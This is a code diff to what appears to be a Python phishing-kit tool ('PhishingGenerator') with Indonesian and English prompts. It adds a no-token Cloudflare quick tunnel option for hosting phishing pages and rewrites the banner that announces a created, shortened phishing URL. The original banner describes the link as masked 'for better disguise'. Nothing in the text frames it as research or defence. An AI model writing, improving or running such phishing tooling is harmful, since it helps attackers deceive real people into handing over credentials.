@@ -832,7 +832,7 @@ class PhishingGenerator:
         console.print(f"[2] Pinggy {'✅ (current)' if current == TUNNEL_PINGGY else ''}")
         console.print(f"    [dim]Fast, no auth needed, SSH-based, no redirect[/]")
         console.print(f"[3] Cloudflare Tunnel {'✅ (current)' if current == TUNNEL_CLOUDFLARE else ''}")
-        console.print(f"    [dim]Fast, stable, needs token (saved in session)[/]")
+        console.print(f"    [dim]Fast, stable; needs token for custom domain, or auto quick tunnel[/]")
         while True:
             c = console.input(f"\n[yellow][[?]] Select (1-3): [/]")
             if c == "1":
@@ -843,6 +843,12 @@ class PhishingGenerator:
                 break
             elif c == "3":
                 self.tunnel_type = TUNNEL_CLOUDFLARE
+                cf_choice = console.input(f"\n[yellow][[?]] {'Use existing token?' if self.cf_token else 'Token available?'} (y=token / n=quick tunnel) [y/n]: [/]").strip().lower()
+                if cf_choice != 'y':
+                    # Clear token to force quick tunnel
+                    self.cf_token = None
+                    self._clear_session_keys(['cf_token', 'cf_url'])
+                    console.print("[dim]→ Using Quick Tunnel (trycloudflare.com, no token needed)[/]")
                 break
         self._save_session_key('tunnel_type', self.tunnel_type)
 
@@ -1356,15 +1362,14 @@ class PhishingGenerator:
                 console.print("[red]❌ All URL shorteners failed. Using raw link.[/]")
                 shortened_url = phish_url
             
-            console.print(Panel(f"""
-[cyan]🎣 Link Phishing Berhasil Dibuat![/]
-    
-[yellow]{'Phishing URL' if self.language == 'en' else 'URL Phishing'}:[/]
-{shortened_url}
-
-[green]✨ {'Link has been shortened and masked for better disguise!' if self.language == 'en' else 'Link telah dipersingkat dan dimasker!'}[/]
-[red]⚠️ {'Link will stay active until program is closed' if self.language == 'en' else 'Link akan tetap aktif hingga program ditutup'}[/]
-            """))
+            sep = "─" * 40
+            console.print(f"\n{sep}")
+            console.print(f"🎣 {'LINK PHISHING BERHASIL DIBUAT!' if self.language == 'id' else 'PHISHING LINK CREATED!'}")
+            console.print(sep)
+            console.print(f"\n📎 {'URL Phishing' if self.language == 'id' else 'Phishing URL'}:\n   [green]{shortened_url}[/]\n")
+            console.print(f"✨ {'Link telah dipersingkat!' if self.language == 'id' else 'Link has been shortened!'}")
+            console.print(f"⚠️  {'Link aktif hingga program ditutup' if self.language == 'id' else 'Link active until program closes'}")
+            console.print(sep)
             
             return shortened_url
             
